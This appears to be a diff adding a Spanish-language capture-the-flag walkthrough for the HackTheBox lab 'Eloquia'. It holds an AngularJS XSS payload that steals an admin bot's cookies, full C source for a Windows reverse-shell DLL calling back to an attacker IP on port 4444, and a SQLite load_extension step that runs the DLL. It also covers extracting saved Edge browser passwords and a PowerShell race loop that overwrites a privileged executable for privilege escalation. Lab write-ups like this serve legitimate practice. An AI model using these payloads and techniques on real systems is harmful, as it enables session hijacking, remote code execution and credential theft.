@@ -1,0 +1,120 @@
+* crea una cuenta en eloquia.htb
+* puedes crear un XSS con creando un articulo y colocando en la descripcion
+  <p><p ng-focus="formData.comment=$event.view.document.cookie;submitForm()" autofocus tabindex="0">Loading article content...</p></p>
+* reporta tu articulo y espera unos segundos a que el bot publique el comentario con sus cookies
+* reemplaza por tus cookies y recarga la pagina, ahora eres admin
+* explora y encuentra un lugar donde puedes colocar consultas sqlite3
+* crea y compila (x86_64-w64-mingw32-gcc -shared -o revshell.dll revshell.c -lws2_32) el dll malicioso
+
+#include <winsock2.h>
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+#pragma comment(lib, "ws2_32.lib")
+
+#define LHOST "10.10.14.193"
+#define LPORT 4444
+
+// Function that will be called when DLL is loaded
+__declspec(dllexport) void revshell(void) {
+   WSADATA wsaData;
+   SOCKET sock;
+   struct sockaddr_in addr;
+   STARTUPINFO si;
+   PROCESS_INFORMATION pi;
+   char cmd[] = "cmd.exe";
+   
+   // Initialize Winsock
+   if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+       return;
+   }
+   
+   // Create socket
+   sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+   if (sock == INVALID_SOCKET) {
+       WSACleanup();
+       return;
+   }
+   
+   // Setup address structure
+   addr.sin_family = AF_INET;
+   addr.sin_addr.s_addr = inet_addr(LHOST);
+   addr.sin_port = htons(LPORT);
+   
+   // Connect to listener
+   if (WSAConnect(sock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
+       closesocket(sock);
+       WSACleanup();
+       return;
+   }
+   
+   // Setup process startup info
+   ZeroMemory(&si, sizeof(si));
+   si.cb = sizeof(si);
+   si.dwFlags = STARTF_USESTDHANDLES;
+   si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
+   
+   // Create process with redirected I/O
+   ZeroMemory(&pi, sizeof(pi));
+   if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+       closesocket(sock);
+       WSACleanup();
+       return;
+   }
+   
+   // Wait for process to exit
+   WaitForSingleObject(pi.hProcess, INFINITE);
+   
+   // Cleanup
+   CloseHandle(pi.hProcess);
+   CloseHandle(pi.hThread);
+   closesocket(sock);
+   WSACleanup();
+}
+
+// Alternative: Simple test function that shows MessageBox
+__declspec(dllexport) void test(void) {
+   MessageBox(NULL, "DLL Loaded Successfully!", "Eloquia HTB", MB_OK | MB_ICONINFORMATION);
+}
+
+// DLL entry point - called when DLL is loaded
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
+   switch (fdwReason) {
+       case DLL_PROCESS_ATTACH:
+           // Uncomment ONE of these:
+           // test();  // For testing only - shows MessageBox
+           revshell(); // For actual reverse shell
+           break;
+       case DLL_PROCESS_DETACH:
+           break;
+       case DLL_THREAD_ATTACH:
+           break;
+       case DLL_THREAD_DETACH:
+           break;
+   }
+   return TRUE;
+}
+
+
+* puedes usar el editor para subir una dll malicioas a static/assets/images/blog/lib.dll
+* consume la dll maliciosa con SELECT load_extension('.\static\assets\images\blog\lib.dll'); en el ejecutro de querys
+* Con esto obtienes una revshell como web
+* Analisa y extrae las contraseñas del navegador Edge, econtraras la contraseña de olivia.kat
+* Accede a traves de winrm y busque que puedas escribir en la ruta  C:\program files\Qooqle IPS software\Failure2Ban - Prototype\Failure2ban\bin\debug
+* crea un exe malicioso (que añada a olivia a grupo admins, que escriba la root.txt o que te lance una revshell)
+********************************** TRUCAZO DETECTADO ****************************************
+* usando este truco de mierda en windows puedes saltarte por tus huevos la restriccion de no eliminar el archivo y reemplazarlo simplemente por una condicion de carrera
+  while ($true) {
+      try {
+          Copy-Item "./f2b.exe" "./Failure2Ban.exe" -Force -ErrorAction Stop
+          Write-Host "[+] Overwrite successful"
+          break
+      } catch {
+      }
+  }
+
+  !!!!! no puedo creer que funciona, reemplaza sin permiso "D" (delete)
+
+  haz movimientos en qooqle, registra, inicia sesion mal, luego bien, sal, etc. esto hará que se ejecute el ejecutable recien reemplazado
+  disfruta la root.txt
